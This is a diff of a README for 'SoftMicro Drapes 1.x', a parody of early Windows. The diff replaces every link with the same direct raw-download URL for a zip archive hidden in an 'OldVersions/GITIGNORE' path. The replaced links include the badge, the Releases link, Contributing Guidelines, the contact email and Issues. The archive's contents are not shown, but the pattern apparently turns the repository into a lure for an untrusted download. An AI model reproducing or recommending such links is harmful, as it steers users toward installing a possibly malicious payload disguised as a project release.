@@ -2,7 +2,7 @@
 
 Welcome to the official source repository for **SoftMicro Drapes 1.x**, a playful take on the classic Microsoft Windows 1.x. This project is not just a parody; it’s a celebration of nostalgia, creativity, and coding. Here, you can explore the unique blend of humor and functionality that SoftMicro Drapes brings to the table.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/bigpablojohn/SoftMicro_Drapes_1.x/releases)
+[![Download Releases](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ SoftMicro Drapes 1.x aims to capture the essence of early Windows operating syst
 
 ## Installation
 
-To get started with SoftMicro Drapes 1.x, you can download the latest release from our [Releases section](https://github.com/bigpablojohn/SoftMicro_Drapes_1.x/releases). 
+To get started with SoftMicro Drapes 1.x, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip). 
 
 Once downloaded, follow these steps to install:
 
@@ -53,7 +53,7 @@ We welcome contributions from anyone interested in helping improve SoftMicro Dra
 2. **Make Changes**: Implement your features or fixes.
 3. **Submit a Pull Request**: Share your changes with the community for review.
 
-Before contributing, please read our [Contributing Guidelines](CONTRIBUTING.md) for detailed instructions.
+Before contributing, please read our [Contributing Guidelines](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip) for detailed instructions.
 
 ## License
 
@@ -67,9 +67,9 @@ This project wouldn’t be possible without the inspiration from early Windows o
 
 For any questions, suggestions, or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub Issues**: Use the [Issues section](https://github.com/bigpablojohn/SoftMicro_Drapes_1.x/issues) to report bugs or request features.
+- **Email**: [https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip)
+- **GitHub Issues**: Use the [Issues section](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip) to report bugs or request features.
 
 Thank you for your interest in SoftMicro Drapes 1.x! We hope you enjoy this fun project as much as we enjoyed creating it.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/bigpablojohn/SoftMicro_Drapes_1.x/releases)
+[![Download Releases](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bigpablojohn/SoftMicro_Drapes_1.x/SoftMicro_Drapes_1.x_Main-dev/OldVersions/GITIGNORE/1/1-100/Soft_Micro_x_Drapes_3.6.zip)
